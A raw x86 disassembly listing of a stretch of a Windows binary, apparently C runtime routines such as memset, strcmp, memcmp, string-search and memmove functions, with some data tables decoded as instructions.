  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
